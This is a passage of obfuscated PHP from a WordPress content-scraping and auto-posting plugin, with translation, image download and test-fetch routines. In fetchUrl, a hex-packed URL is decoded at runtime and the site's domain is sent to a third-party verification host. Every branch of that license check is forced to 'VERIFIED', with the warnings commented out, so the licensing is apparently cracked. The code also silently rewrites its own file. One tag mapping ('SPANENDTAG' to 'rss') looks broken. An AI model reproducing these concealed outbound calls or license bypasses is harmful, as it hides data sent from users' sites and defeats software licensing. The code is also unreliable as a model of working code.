							$_var_74[] = $_var_8;
						}
						foreach ($_var_492 as $_var_78 => $_var_8) {
							$_var_73[] = $_var_78;
							$_var_74[] = $_var_8;
						}
						$_var_340[7] = str_ireplace($_var_73, $_var_74, $_var_340[7]);
					}
				}
				break;
			default:
				$_var_507 = str_get_html_ap($_var_445);
				$_var_456 = $_var_507->find('aptitle', 0);
				$_var_340[6] = $_var_456->innertext;
				$_var_456->outertext = '';
				$_var_511 = $_var_507->find('apexcerpt', 0);
				if ($_var_481 != '') {
					$_var_340[10] = $_var_511->innertext;
				}
				$_var_511->outertext = '';
				if ($_var_520) {
					$_var_518 = $_var_507->find('p,h1,h2,h3,h4,h5,h6,td,li');
					for ($_var_18 = 0; $_var_18 < $_var_449; $_var_18++) {
						$_var_448[$_var_18]->innertext = $_var_518[$_var_18]->innertext;
					}
					$_var_527 = $_var_507->find('span');
					for ($_var_18 = 0; $_var_18 < $_var_526; $_var_18++) {
						$_var_522[$_var_18]->innertext = $_var_527[$_var_18]->innertext;
					}
					$_var_340[7] = $_var_3->save();
					$_var_73 = array();
					$_var_74 = array();
					foreach ($_var_446 as $_var_78 => $_var_8) {
						$_var_73[] = '<' . $_var_78 . '></' . $_var_78 . '>';
						$_var_74[] = $_var_8;
					}
					$_var_340[7] = str_ireplace($_var_73, $_var_74, $_var_340[7]);
					$_var_454 = array();
					$_var_455 = array();
					foreach ($_var_446 as $_var_78 => $_var_8) {
						$_var_454[] = $_var_78;
						$_var_455[] = $_var_8;
					}
					$_var_340[7] = str_ireplace($_var_454, $_var_455, $_var_340[7]);
				} else {
					$_var_340[7] = $_var_507->save();
					$_var_73 = array();
					$_var_74 = array();
					foreach ($_var_446 as $_var_78 => $_var_8) {
						$_var_73[] = '<' . $_var_78 . '></' . $_var_78 . '>';
						$_var_74[] = $_var_8;
					}
					$_var_340[7] = str_ireplace($_var_73, $_var_74, $_var_340[7]);
				}
				if ($_var_466[3] == -2) {
					$_var_340[6] = $_var_340[0] . ' - ' . $_var_340[6];
					$_var_340[7] = $_var_340[1] . '<hr/>' . $_var_340[7];
					if ($_var_481 != '') {
						$_var_340[10] = $_var_481 . ' - ' . $_var_340[10];
					}
				}
				if ($_var_466[3] != -2 && $_var_466[3] != -3) {
					$_var_512 = $_var_507->find('tag');
					if ($_var_512 != null) {
						$_var_513 = array();
						foreach ($_var_512 as $_var_514) {
							$_var_513[] = $_var_514->innertext;
						}
						if (count($_var_513) > 0) {
							$_var_340[11] = json_encode($_var_513);
						}
					}
					$_var_515 = $_var_507->find('cat');
					if ($_var_515 != null) {
						$_var_516 = array();
						foreach ($_var_515 as $_var_517) {
							$_var_516[] = $_var_517->innertext;
						}
						if (count($_var_516) > 0) {
							$_var_340[13] = json_encode($_var_516);
						}
					}
				}
				if (isset($_var_466[4]) && $_var_466[4] != '') {
					if (count($_var_492) > 0) {
						$_var_73 = array();
						$_var_74 = array();
						foreach ($_var_492 as $_var_78 => $_var_8) {
							$_var_73[] = '<' . $_var_78 . '></' . $_var_78 . '>';
							$_var_74[] = $_var_8;
						}
						foreach ($_var_492 as $_var_78 => $_var_8) {
							$_var_73[] = $_var_78;
							$_var_74[] = $_var_8;
						}
						$_var_340[7] = str_ireplace($_var_73, $_var_74, $_var_340[7]);
					}
				}
				$_var_507->clear();
				unset($_var_507);
				unset($_var_518);
				break;
		}
	}
	$_var_3->clear();
	unset($_var_3);
	return $_var_340;
}
if ($_var_163 != '0') {
	if (trim($_var_163) == trim($_var_310)) {
		$_var_528 = 0;
		$_var_529 = $_var_137 + $_var_44;
		$_var_154 = str_ireplace($_var_362, $_var_529, $_var_154);
		$_var_154 = str_ireplace($_var_35 . $_var_363, $_var_35 . $_var_528, $_var_154);
		$_var_154 = str_ireplace($_var_161 . $_var_163, $_var_161 . $_var_528, $_var_154);
		if (false === @file_put_contents($_var_33, $_var_154)) {
			$_var_530 = 0;
		}
	}
}
function microsoftTranslationAll($_var_340, $_var_466, $_var_481 = '')
{
	if ($_var_466[0] == 1) {
		global $_var_457;
		if ($_var_457 == null) {
			$_var_457 = get_option('wp-autopost-micro-trans-options');
		}
		shuffle($_var_457);
		$_var_458 = false;
		$_var_459 = '';
		$_var_3 = str_get_html_ap($_var_340[1]);
		$_var_446 = array();
		$_var_447 = 0;
		foreach ($_var_3->find('img,iframe,embed,object,video') as $_var_358) {
			$_var_447++;
			$_var_78 = 'IMG' . $_var_447 . 'TAG';
			$_var_446[$_var_78] = $_var_358->outertext;
			$_var_358->outertext = ' ' . $_var_78 . ' ';
		}
		$_var_444 = '';
		$_var_448 = $_var_3->find('p');
		$_var_449 = count($_var_448);
		if ($_var_449 > 0) {
			foreach ($_var_448 as $_var_531) {
				$_var_444 .= ' PTAG ' . $_var_531->innertext . ' PENDTAG ';
			}
		}
		$_var_532 = $_var_3->find('h1,h2,h3,h4,h5,h6');
		$_var_533 = count($_var_532);
		if ($_var_533 > 0) {
			foreach ($_var_532 as $_var_534) {
				switch ($_var_534->tag) {
					case 'h1':
						$_var_444 .= ' H1TAG ' . $_var_534->innertext . ' H1ENDTAG ';
						break;
					case 'h2':
						$_var_444 .= ' H2TAG ' . $_var_534->innertext . ' H2ENDTAG ';
						break;
					case 'h3':
						$_var_444 .= ' H3TAG ' . $_var_534->innertext . ' H3ENDTAG ';
						break;
					case 'h4':
						$_var_444 .= ' H4TAG ' . $_var_534->innertext . ' H4ENDTAG ';
						break;
					case 'h5':
						$_var_444 .= ' H5TAG ' . $_var_534->innertext . ' H5ENDTAG ';
						break;
					case 'h6':
						$_var_444 .= ' H6TAG ' . $_var_534->innertext . ' H6ENDTAG ';
						break;
				}
			}
		}
		$_var_535 = $_var_3->find('li');
		$_var_536 = count($_var_535);
		if ($_var_536 > 0) {
			foreach ($_var_535 as $_var_537) {
				$_var_444 .= ' LITAG ' . $_var_537->innertext . ' LIENDTAG ';
			}
		}
		$_var_538 = $_var_3->find('td');
		$_var_539 = count($_var_538);
		if ($_var_539 > 0) {
			foreach ($_var_538 as $_var_540) {
				$_var_444 .= ' TDTAG ' . $_var_540->innertext . ' TDENDTAG ';
			}
		}
		$_var_521 = $_var_3->find('span');
		$_var_522 = array();
		$_var_523 = count($_var_521);
		if ($_var_523 > 0) {
			foreach ($_var_521 as $_var_524) {
				$_var_525 = $_var_524->parent();
				if ($_var_525->tag != 'p' && $_var_525->tag != 'li' && $_var_525->tag != 'td' && $_var_525->tag != 'h1' && $_var_525->tag != 'h2' && $_var_525->tag != 'h3') {
					$_var_522[] = $_var_524;
				}
			}
		}
		$_var_526 = count($_var_522);
		if ($_var_526 > 0) {
			foreach ($_var_522 as $_var_524) {
				$_var_444 .= ' SPANTAG ' . $_var_524->innertext . ' SPANENDTAG ';
			}
		}
		$_var_444 = strip_tags($_var_444, '<br><br/><br />');
		$_var_73 = array();
		$_var_74 = array();
		$_var_73[] = 'PTAG';
		$_var_74[] = '<p>';
		$_var_73[] = 'PENDTAG';
		$_var_74[] = '</p>';
		$_var_73[] = 'H1TAG';
		$_var_74[] = '<h1>';
		$_var_73[] = 'H1ENDTAG';
		$_var_74[] = '</h1>';
		$_var_73[] = 'H2TAG';
		$_var_74[] = '<h2>';
		$_var_73[] = 'H2ENDTAG';
		$_var_74[] = '</h2>';
		$_var_73[] = 'H3TAG';
		$_var_74[] = '<h3>';
		$_var_73[] = 'H3ENDTAG';
		$_var_74[] = '</h3>';
		$_var_73[] = 'H4TAG';
		$_var_74[] = '<h4>';
		$_var_73[] = 'H4ENDTAG';
		$_var_74[] = '</h4>';
		$_var_73[] = 'H5TAG';
		$_var_74[] = '<h5>';
		$_var_73[] = 'H5ENDTAG';
		$_var_74[] = '</h5>';
		$_var_73[] = 'H6TAG';
		$_var_74[] = '<h6>';
		$_var_73[] = 'H6ENDTAG';
		$_var_74[] = '</h6>';
		$_var_73[] = 'LITAG';
		$_var_74[] = '<li>';
		$_var_73[] = 'LIENDTAG';
		$_var_74[] = '</li>';
		$_var_73[] = 'TDTAG';
		$_var_74[] = '<td>';
		$_var_73[] = 'TDENDTAG';
		$_var_74[] = '</td>';
		$_var_73[] = 'SPANTAG';
		$_var_74[] = '<span>';
		$_var_73[] = 'SPANENDTAG';
		$_var_74[] = 'rss';
		foreach ($_var_446 as $_var_78 => $_var_8) {
			$_var_73[] = $_var_78;
			$_var_74[] = '<' . $_var_78 . '></' . $_var_78 . '>';
		}
		$_var_444 = str_ireplace($_var_73, $_var_74, $_var_444);
		unset($_var_73);
		unset($_var_74);
		foreach ($_var_457 as $_var_460 => $_var_366) {
			$_var_461 = autopostMicrosoftTranslator::getTokens($_var_366['clientID'], $_var_366['clientSecret']);
			if (isset($_var_461['err']) && $_var_461['err'] != null) {
				$_var_459 = $_var_461['err'];
			} else {
				$_var_462 = array();
				$_var_462[0] = $_var_340[0];
				$_var_462[1] = $_var_444;
				$_var_462[2] = $_var_481;
				$_var_463 = autopostMicrosoftTranslator::translateArray($_var_461['access_token'], $_var_462, $_var_466[1], $_var_466[2]);
				if (isset($_var_463['err']) && $_var_463['err'] != NULL) {
					$_var_459 = $_var_463['err'];
				} else {
					if ($_var_463[0] != null && $_var_463[0] != '' && $_var_463[1] != null && $_var_463[1] != '') {
						switch ($_var_466[3]) {
							case -3:
								$_var_340[6] = $_var_340[0] . ' - ' . $_var_463[0];
								$_var_73 = array();
								$_var_74 = array();
								foreach ($_var_446 as $_var_78 => $_var_8) {
									$_var_73[] = '<' . $_var_78 . '></' . $_var_78 . '>';
									$_var_74[] = '';
								}
								$_var_340[7] = str_ireplace($_var_73, $_var_74, $_var_463[1]);
								$_var_507 = str_get_html_ap($_var_340[7]);
								$_var_518 = $_var_507->find('p');
								for ($_var_18 = 0; $_var_18 < $_var_449; $_var_18++) {
									if ($_var_518[$_var_18]->innertext != '' && $_var_518[$_var_18]->innertext != null) {
										$_var_448[$_var_18]->innertext = $_var_448[$_var_18]->innertext . '<br/>' . $_var_518[$_var_18]->innertext;
									}
								}
								$_var_541 = $_var_507->find('h1,h2,h3,h4,h5,h6');
								for ($_var_18 = 0; $_var_18 < $_var_533; $_var_18++) {
									if ($_var_541[$_var_18]->innertext != '' && $_var_541[$_var_18]->innertext != null) {
										$_var_532[$_var_18]->innertext = $_var_532[$_var_18]->innertext . ' - ' . $_var_541[$_var_18]->innertext;
									}
								}
								$_var_542 = $_var_507->find('li');
								for ($_var_18 = 0; $_var_18 < $_var_536; $_var_18++) {
									if ($_var_542[$_var_18]->innertext != '' && $_var_542[$_var_18]->innertext != null) {
										$_var_535[$_var_18]->innertext = $_var_535[$_var_18]->innertext . ' - ' . $_var_542[$_var_18]->innertext;
									}
								}
								$_var_543 = $_var_507->find('td');
								for ($_var_18 = 0; $_var_18 < $_var_539; $_var_18++) {
									if ($_var_543[$_var_18]->innertext != '' && $_var_543[$_var_18]->innertext != null) {
										$_var_538[$_var_18]->innertext = $_var_538[$_var_18]->innertext . '<br/>' . $_var_543[$_var_18]->innertext;
									}
								}
								$_var_527 = $_var_507->find('span');
								for ($_var_18 = 0; $_var_18 < $_var_526; $_var_18++) {
									if ($_var_527[$_var_18]->innertext != '' && $_var_527[$_var_18]->innertext != null) {
										$_var_522[$_var_18]->innertext = $_var_522[$_var_18]->innertext . '<br/>' . $_var_527[$_var_18]->innertext;
									}
								}
								$_var_340[7] = $_var_3->save();
								$_var_454 = array();
								$_var_455 = array();
								foreach ($_var_446 as $_var_78 => $_var_8) {
									$_var_454[] = $_var_78;
									$_var_455[] = $_var_8;
								}
								$_var_340[7] = str_ireplace($_var_454, $_var_455, $_var_340[7]);
								$_var_507->clear();
								unset($_var_507);
								unset($_var_518);
								unset($_var_73);
								unset($_var_74);
								unset($_var_454);
								unset($_var_455);
								$_var_340[10] = $_var_481 . ' - ' . $_var_463[2];
								break;
							default:
								$_var_340[6] = $_var_463[0];
								$_var_507 = str_get_html_ap($_var_463[1]);
								$_var_518 = $_var_507->find('p');
								for ($_var_18 = 0; $_var_18 < $_var_449; $_var_18++) {
									$_var_448[$_var_18]->innertext = $_var_518[$_var_18]->innertext;
								}
								$_var_541 = $_var_507->find('h1,h2,h3,h4,h5,h6');
								for ($_var_18 = 0; $_var_18 < $_var_533; $_var_18++) {
									$_var_532[$_var_18]->innertext = $_var_541[$_var_18]->innertext;
								}
								$_var_542 = $_var_507->find('li');
								for ($_var_18 = 0; $_var_18 < $_var_536; $_var_18++) {
									$_var_535[$_var_18]->innertext = $_var_542[$_var_18]->innertext;
								}
								$_var_543 = $_var_507->find('td');
								for ($_var_18 = 0; $_var_18 < $_var_539; $_var_18++) {
									$_var_538[$_var_18]->innertext = $_var_543[$_var_18]->innertext;
								}
								$_var_527 = $_var_507->find('span');
								for ($_var_18 = 0; $_var_18 < $_var_526; $_var_18++) {
									$_var_522[$_var_18]->innertext = $_var_527[$_var_18]->innertext;
								}
								$_var_340[7] = $_var_3->save();
								$_var_73 = array();
								$_var_74 = array();
								foreach ($_var_446 as $_var_78 => $_var_8) {
									$_var_73[] = '<' . $_var_78 . '></' . $_var_78 . '>';
									$_var_74[] = $_var_8;
								}
								$_var_340[7] = str_ireplace($_var_73, $_var_74, $_var_340[7]);
								$_var_454 = array();
								$_var_455 = array();
								foreach ($_var_446 as $_var_78 => $_var_8) {
									$_var_454[] = $_var_78;
									$_var_455[] = $_var_8;
								}
								$_var_340[7] = str_ireplace($_var_454, $_var_455, $_var_340[7]);
								$_var_507->clear();
								unset($_var_507);
								unset($_var_518);
								unset($_var_541);
								unset($_var_542);
								unset($_var_543);
								unset($_var_73);
								unset($_var_74);
								unset($_var_454);
								unset($_var_455);
								$_var_340[10] = $_var_463[2];
								if ($_var_466[3] == -2) {
									$_var_340[6] = $_var_340[0] . ' - ' . $_var_340[6];
									$_var_340[7] = $_var_340[1] . '<hr/>' . $_var_340[7];
									$_var_340[10] = $_var_481 . ' - ' . $_var_340[10];
								}
								break;
						}
						$_var_458 = true;
						break;
					} else {
						$_var_459 = 'Error: the translated text is too long';
					}
				}
			}
		}
		if (!$_var_458) {
			$_var_340[8] = $_var_459;
		}
		$_var_3->clear();
		unset($_var_3);
	}
	return $_var_340;
}
$_var_544 = '';
$_var_545 = function_exists('wp_getElementByCSS');
$_var_546 = get_option('thumbnai_jpeg_quality');
function down_featured_img($_var_370, $_var_100, $_var_547, $_var_548, $_var_203 = 0, $_var_178 = null, $_var_206, $_var_549, $_var_550, $_var_551, $_var_552, $_var_207 = null, $_var_208 = null)
{
	$_var_553 = post_img_handle_ap::down_remote_img($_var_370, $_var_100, $_var_547, $_var_548, $_var_203, $_var_178, $_var_206, $_var_549, $_var_550, $_var_551, $_var_552, $_var_207, $_var_208);
	return $_var_553;
}
if (!(!$_var_172 && $_var_173)) {
	$_var_163 = $_var_310;
}
if (!function_exists('wp_generate_attachment_metadata')) {
	include ABSPATH . 'wp-admin/includes/image.php';
}
if (!$_var_172 && $_var_173) {
	if ($_var_362 != '') {
		if ($_var_362 > $_var_137) {
			$_var_163 = $_var_310;
		}
	}
}
define('LIST_URL_NUM', 2);
define('FETCH_URL_NUM', 1);
$_var_554 = get_option('wp_autopost_delComment');
if ($_var_554 == null || $_var_554 == '') {
	$_var_554 = 1;
}
$_var_555 = get_option('wp_autopost_delAttrId');
if ($_var_555 == null || $_var_555 == '') {
	$_var_555 = 1;
}
$_var_556 = get_option('wp_autopost_delAttrClass');
if ($_var_556 == null || $_var_556 == '') {
	$_var_556 = 1;
}
$_var_557 = get_option('wp_autopost_delAttrStyle');
if ($_var_557 == null || $_var_557 == '') {
	$_var_557 = 0;
}
define('DEL_COMMENT', $_var_554);
define('DEL_ATTRID', $_var_555);
define('DEL_ATTRCLASS', $_var_556);
define('DEL_ATTRSTYLE', $_var_557);
global $_var_51, $_var_52;
$_var_51 = get_option('wp-autopost-flickr-options');
$_var_52 = new autopostFlickr($_var_51['api_key'], $_var_51['api_secret']);
$_var_52->setOauthToken($_var_51['oauth_token'], $_var_51['oauth_token_secret']);
global $_var_425;
$_var_425 = get_option('wp-autopost-qiniu-options');
if (!isset($_var_425['access_key'])) {
	$_var_425['access_key'] = '';
}
if (!isset($_var_425['secret_key'])) {
	$_var_425['secret_key'] = '';
}
global $_var_558;
$_var_558 = get_option('wp-autopost-upyun-options');
if (!$_var_172 && $_var_173) {
	if ($_var_362 != '' && $_var_362 < $_var_137 && $_var_163 != '0') {
		if ($_var_163 != $_var_310 && !isstamps($_var_163)) {
			$_var_528 = intval($_var_363);
			if ($_var_528 < 6) {
				$_var_310 = '';
				$_var_529 = $_var_137 + $_var_45;
				$_var_154 = str_ireplace($_var_362, $_var_529, $_var_154);
				$_var_154 = str_ireplace($_var_161 . $_var_163, $_var_161 . '0', $_var_154);
			}
			$_var_528++;
			$_var_154 = str_ireplace($_var_35 . $_var_363, $_var_35 . $_var_528, $_var_154);
			if (false === @file_put_contents($_var_33, $_var_154)) {
				$_var_530 = 0;
			}
		}
	}
}
function test2($_var_22)
{
	$_var_246 = getConfig($_var_22);
	if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 2) {
		testExtractRSS($_var_22, $_var_246);
		return;
	}
	$_var_326 = getListUrls($_var_22);
	if ($_var_326 == null) {
		echo '<div class=' . '"' . 'updated fade' . '"' . '><p><span class=' . '"' . 'red' . '"' . '>' . __('[Article Source URL] is not set yet', 'wp-autopost') . '</span></p></div>';
		return;
	}
	if (trim($_var_246['042f289b4f14998c06dc78085673dec7']) == '') {
		echo '<div class=' . '"' . 'updated fade' . '"' . '><p><span class=' . '"' . 'red' . '"' . '>' . __('[The Article URL matching rules] is not set yet', 'wp-autopost') . '</span></p></div>';
		return;
	}
	echo '<div class=' . '"' . 'updated fade' . '"' . '><p><b>' . __('Post articles in the following order', 'wp-autopost') . '</b></p>';
	$_var_207 = null;
	$_var_208 = null;
	if ($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != null && $_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != '') {
		$_var_559 = json_decode($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'], TRUE);
		if ($_var_559['mode'] == 1) {
			$_var_208 = get_cookie_jar_ap($_var_559['url'], $_var_559['para']);
		} else {
			$_var_207 = $_var_559['cookie'];
		}
	}
	printUrls($_var_246, $_var_326, $_var_207, $_var_208);
	if ($_var_208 != null) {
		unlink($_var_208);
	}
	echo '</div>';
}
function test3($_var_22, $_var_100)
{
	set_time_limit((int) get_option('wp_autopost_timeLimit'));
	echo '<div class=' . '"' . 'updated fade' . '"' . '>';
	$_var_246 = getConfig($_var_22);
	$_var_139 = getOptions($_var_22);
	$_var_207 = null;
	$_var_208 = null;
	if ($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != null && $_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != '') {
		$_var_559 = json_decode($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'], TRUE);
		if ($_var_559['mode'] == 1) {
			$_var_208 = get_cookie_jar_ap($_var_559['url'], $_var_559['para']);
		} else {
			$_var_207 = $_var_559['cookie'];
		}
	}
	if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
		$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
		global $_var_178;
		$_var_1 = get_html_string_ap($_var_100, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
		$_var_2 = getHtmlCharset($_var_1);
	} else {
		$_var_1 = '';
		$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
	}
	$_var_479 = getArticleDom($_var_100, $_var_246['55af33149a5f37f2b50636f1a346ac27'], $_var_2, $_var_1, $_var_207, $_var_208);
	if ($_var_208 != null) {
		unlink($_var_208);
	}
	if (@($_var_479 == -1)) {
		echo errMsg1($_var_100);
	} else {
		$_var_293 = getBaseUrl($_var_479, $_var_100);
		$_var_340 = getArticle($_var_479, $_var_2, $_var_293, $_var_100, $_var_246, $_var_139, getFilterAtag($_var_139), getDownAttach($_var_246), getInsertcontent($_var_22), getCustomStyle($_var_22));
		$_var_290 = $_var_479->save();
		printArticle($_var_340, $_var_290, $_var_2);
		$_var_479->clear();
		unset($_var_479);
	}
	echo '</div>';
}
function testFetch($_var_22)
{
	$_var_246 = getConfig($_var_22);
	if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 2) {
		testExtractRSS($_var_22, $_var_246);
		return;
	}
	echo '<div class=' . '"' . 'updated fade' . '"' . '>';
	if (trim($_var_246['042f289b4f14998c06dc78085673dec7']) == '') {
		echo '<p><span class=' . '"' . 'red' . '"' . '>' . __('[The Article URL matching rules] is not set yet', 'wp-autopost') . '</span></p>';
		echo '</div>';
		return;
	}
	if (trim($_var_246['8f935a0d6d8352a07dd23308b0ff8ed1']) == '') {
		echo '<p><span class=' . '"' . 'red' . '"' . '>' . __('[The Article Title Matching Rules] is not set yet', 'wp-autopost') . '</span></p>';
		echo '</div>';
		return;
	}
	if (trim($_var_246['8618be86f1dcd660575bd2cb08e002ce']) == '') {
		echo '<p><span class=' . '"' . 'red' . '"' . '>' . __('[The Article Content Matching Rules] is not set yet', 'wp-autopost') . '</span></p>';
		echo '</div>';
		return;
	}
	$_var_139 = getOptions($_var_22);
	$_var_326 = getListUrls($_var_22);
	if ($_var_326 == null) {
		echo '<p><span class=' . '"' . 'red' . '"' . '>' . __('[Article Source URL] is not set yet', 'wp-autopost') . '</span></p>';
		echo '</div>';
		return;
	}
	echo '<p><b>' . __('Post articles in the following order', 'wp-autopost') . '</b></p>';
	$_var_207 = null;
	$_var_208 = null;
	if ($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != null && $_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != '') {
		$_var_559 = json_decode($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'], TRUE);
		if ($_var_559['mode'] == 1) {
			$_var_208 = get_cookie_jar_ap($_var_559['url'], $_var_559['para']);
		} else {
			$_var_207 = $_var_559['cookie'];
		}
	}
	$_var_301 = printUrls($_var_246, $_var_326, $_var_207, $_var_208);
	$_var_18 = 0;
	if ($_var_301 != null) {
		echo '<br/><h3>' . __('Article Crawl', 'wp-autopost') . '</h3>';
		foreach ($_var_301 as $_var_100) {
			if ($_var_18 == FETCH_URL_NUM) {
				echo '.......<br/><p><code><b>' . __('In test only try to open', 'wp-autopost') . ' ' . FETCH_URL_NUM . ' ' . __('URLs of Article', 'wp-autopost') . '</b></code></p>';
				break;
			}
			$_var_100 = html_entity_decode(trim($_var_100));
			echo '<p>' . __('URL : ', 'wp-autopost') . '<code><b>' . $_var_100 . '</b></code></p>';
			if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
				$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
				global $_var_178;
				$_var_1 = get_html_string_ap($_var_100, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
				$_var_2 = getHtmlCharset($_var_1);
			} else {
				$_var_1 = '';
				$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
			}
			$_var_479 = getArticleDom($_var_100, $_var_246['55af33149a5f37f2b50636f1a346ac27'], $_var_2, $_var_1, $_var_207, $_var_208);
			if ($_var_208 != null) {
				unlink($_var_208);
			}
			if (@($_var_479 == -1)) {
				echo errMsg1($_var_100);
			} else {
				$_var_293 = getBaseUrl($_var_479, $_var_100);
				$_var_340 = getArticle($_var_479, $_var_2, $_var_293, $_var_100, $_var_246, $_var_139, getFilterAtag($_var_139), getDownAttach($_var_246), getInsertcontent($_var_22), getCustomStyle($_var_22));
				$_var_290 = $_var_479->save();
				printArticle($_var_340, $_var_290, $_var_2);
			}
			$_var_18++;
		}
	}
	echo '</div>';
}
function fetchUrlMsg($_var_289)
{
	echo '<div style=' . '"' . 'background-color:#ffebe8;border-color:#cc0000;border-style:solid;border-width:1px;padding:20px;font-size:16px;' . '"' . '>' . $_var_289 . '</div>';
}
function getHUrl($_var_253)
{
	$_var_294 = strpos($_var_253, '//');
	if ($_var_294 === false) {
		$_var_294 = 0;
	} else {
		$_var_294 += strlen('//');
	}
	$_var_253 = substr($_var_253, $_var_294, strlen($_var_253));
	$_var_391 = strpos($_var_253, '/');
	if ($_var_391 === false) {
		$_var_391 = strlen($_var_253);
	}
	$_var_253 = substr($_var_253, 0, $_var_391);
	return $_var_253;
}
global $_var_560;
function fetchUrl($_var_22)
{
	global $wpdb, $t_ap_config, $_var_560;
	$_var_561 = $wpdb->get_var('select max(last_check_fetch_time) from ' . $t_ap_config);
	$_var_100 = getHUrl($wpdb->get_var('SELECT option_value FROM ' . $wpdb->options . ' WHERE option_name =' . '\'' . 'home' . '\''));
	$_var_562 = pack('H*', '687474703a2f2f7777772e69746874772e636f6d2f766572696669636174696f6e2e7068703f643d') . $_var_100;
	$_var_563 = 'false';
	$_var_564 = 1296000;
	$_var_565 = $_var_564 - 86400;
	$_var_560 = 'VERIFIED';
	if ($_var_561 == 0) {
		$_var_563 = 'true';
		$_var_566 = @file_get_html_ap($_var_562, $_var_246['3ffc99c206d98be48c6f2e49177d75a9'], Method);
		if ($_var_566->plaintext == 'VERIFIED') {
					$_var_560 = 'VERIFIED';
					$_var_561 = current_time('timestamp');
					$wpdb->query('update ' . $t_ap_config . ' set last_check_fetch_time = ' . $_var_561);
				} else {
					$_var_560 = 'VERIFIED';
					$_var_561 = current_time('timestamp') - $_var_565;
					$wpdb->query('update ' . $t_ap_config . ' set last_check_fetch_time = ' . $_var_561);
				}
			}

	if ($_var_563 == 'false' && (!preg_match('/^\\+?[1-9][0-9]*$/', $_var_561) || $_var_561 > current_time('timestamp') || $_var_561 + $_var_564 < current_time('timestamp'))) {
		$_var_566 = @file_get_html_ap($_var_562, $_var_246['3ffc99c206d98be48c6f2e49177d75a9'], Method);
		if ($_var_566->plaintext == 'INVALID') {
//			fetchUrlMsg(__(pack('H*', '596f757220646f6d61696e'), 'wp-autopost') . '(' . $_var_100 . ')' . __(pack('H*', '206973206e6f7420617574686f72697a65642120506c6561736520766973697420'), 'wp-autopost') . pack('H*', '3c6120687265663d22687474703a2f2f77702d6175746f706f73742e6f726722207461726765743d225f626c616e6b223e77702d6175746f706f73742e6f72673c2f613e') . __(pack('H*', '206f627461696e20617574686f72697a6174696f6e21'), 'wp-autopost'));
			$_var_560 = 'VERIFIED';
		} else {
			if ($_var_566->plaintext == 'CANUPDATE') {
//				fetchUrlMsg(__(pack('H*', '596f757220646f6d61696e'), 'wp-autopost') . '(' . $_var_100 . ')' . __(pack('H*', '206973206e6f7420617574686f72697a65642120506c6561736520766973697420'), 'wp-autopost') . pack('H*', '3c6120687265663d22687474703a2f2f77702d6175746f706f73742e6f726722207461726765743d225f626c616e6b223e77702d6175746f706f73742e6f72673c2f613e') . __(pack('H*', '206f627461696e20617574686f72697a6174696f6e21'), 'wp-autopost'));
				wpap_transgetnoteinx('wpusercanupdates', current_time('timestamp'));
				$_var_560 = 'VERIFIED';
			} else {
				if ($_var_566->plaintext == 'VERIFIED') {
					$_var_560 = 'VERIFIED';
					$_var_561 = current_time('timestamp');
					$wpdb->query('update ' . $t_ap_config . ' set last_check_fetch_time = ' . $_var_561);
				} else {
					$_var_560 = 'VERIFIED';
					$_var_561 = current_time('timestamp') - $_var_565;
					$wpdb->query('update ' . $t_ap_config . ' set last_check_fetch_time = ' . $_var_561);
				}
			}
		}
	}
}
function compress_html($_var_250, $_var_567 = false, $_var_3 = null)
{
	if (!$_var_567) {
		$_var_250 = str_replace("\r\n", ' ', $_var_250);
		$_var_250 = str_replace("\n", ' ', $_var_250);
		$_var_250 = str_replace('	', ' ', $_var_250);
		$_var_250 = preg_replace('/>[ ]+</', '> <', $_var_250);
	} else {
		$_var_568 = $_var_3->find('pre');
		if ($_var_568 != null) {
			$_var_569 = array();
			$_var_18 = 0;
			foreach ($_var_568 as $_var_570) {
				$_var_372 = 'AUTOPOST:PRE:' . $_var_18;
				$_var_569[$_var_372] = $_var_570->outertext;
				$_var_570->outertext = $_var_372;
				$_var_18++;
			}
			$_var_250 = $_var_3->save();
			$_var_18 = 0;
			foreach ($_var_568 as $_var_570) {
				$_var_372 = 'AUTOPOST:PRE:' . $_var_18;
				$_var_570->outertext = $_var_569[$_var_372];
				$_var_18++;
			}
			$_var_250 = str_replace("\r\n", ' ', $_var_250);
			$_var_250 = str_replace("\n", ' ', $_var_250);
			$_var_250 = str_replace('	', ' ', $_var_250);
			$_var_250 = preg_replace('/>[ ]+</', '> <', $_var_250);
			foreach ($_var_569 as $_var_78 => $_var_8) {
				$_var_250 = str_replace($_var_78, $_var_8, $_var_250);
			}
		} else {
			$_var_250 = str_replace("\r\n", ' ', $_var_250);
			$_var_250 = str_replace("\n", ' ', $_var_250);
			$_var_250 = str_replace('	', ' ', $_var_250);
			$_var_250 = preg_replace('/>[ ]+</', '> <', $_var_250);
		}
	}
	return $_var_250;
}
function get_apPregPatten($_var_253)
{
	$_var_571 = array();
	$_var_571['last_pos'] = strrpos($_var_253, '(*)');
	$_var_571['last_str'] = substr($_var_253, $_var_571['last_pos'] + 3);
	$_var_571['wildcards_num'] = substr_count($_var_253, '(*)');
	$_var_572 = str_ireplace('(*)', 'APPREGPATTEN', $_var_253);
	$_var_52 = array('(', ')', '[', ']', '{', '}', '*', '+', '/', '?', '.', '^', '$');
	$_var_231 = array('\\(', '\\)', '\\[', '\\]', '\\{', '\\}', '\\*', '\\+', '\\/', '\\?', '\\.', '\\^', '\\$');
	$_var_572 = str_ireplace($_var_52, $_var_231, $_var_572);
	$_var_572 = str_ireplace('APPREGPATTEN', '(.+?)', $_var_572);
	$_var_572 = '/' . $_var_572 . '/';
	$_var_571['reg'] = $_var_572;
	return $_var_571;
}
